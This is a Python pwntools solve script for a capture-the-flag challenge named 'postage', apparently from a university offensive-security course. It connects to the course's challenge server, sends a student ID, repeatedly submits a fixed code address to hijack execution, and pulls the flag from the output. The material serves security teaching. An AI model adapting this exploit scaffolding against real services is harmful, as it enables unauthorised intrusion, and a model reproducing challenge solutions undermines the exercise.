#import from py
import re

#outside imports
import sys
import os
import pwn

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1250
netid='pk1898'

do_remote = True
binary_name = './postage'

#for doing local debugging
is_local_dbg = False
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b *0x004008bb
'''

#universal flag finder, given a string
def find_flag(input):
    m = pwn.re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


#some address
solution = 0x004008d0
def solve(target):
    for x in pwn.range(255):
        print('discarded: %s' % target.readline())
        print(target.sendline(str(solution)))
        print(target.readline())
    return target.readline()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = pwn.remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = pwn.gdb.debug(binary_name, gdb_script)
        else:
            target = pwn.process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = solve(p)
    if(flag):
        print("Challenge Solved: %s" % flag)
    else:
        print("Challenge Not Solved")

if __name__ == '__main__':
    main()
